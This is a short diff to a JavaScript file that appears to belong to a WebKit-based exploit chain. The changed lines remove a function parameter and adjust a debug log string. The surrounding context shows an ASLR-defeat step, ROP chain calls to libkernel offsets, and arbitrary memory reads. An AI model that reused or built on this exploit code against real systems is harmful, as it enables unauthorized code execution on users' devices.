@@ -509,7 +509,7 @@ const IPV6_PKTINFO = 46;
  * @param {UserlandRW} p 
  * @returns {Promise<{p: WebkitPrimitives, chain: worker_rop}>}
  */
-async function prepare(p) {
+async function prepare() {
     //ASLR defeat patsy (former vtable buddy)
     let textArea = document.createElement("textarea");
 
@@ -1066,7 +1066,7 @@ async function main(userlandRW) {
             // Join pthread and wait until we're finished executing
             await chain.call(p.libKernelBase.add32(OFFSET_lk_pthread_join), p.read8(pthread_handle_store), pthread_value_store);
             let res = p.read8(test_payload_store).low << 0;
-            debug_log("    Finished, out = 0x" + res.toString(16), LogLevel.LOG);
+            debug_log("Finished, out = 0x" + res.toString(16), LogLevel.LOG);
 
             return res;
         }
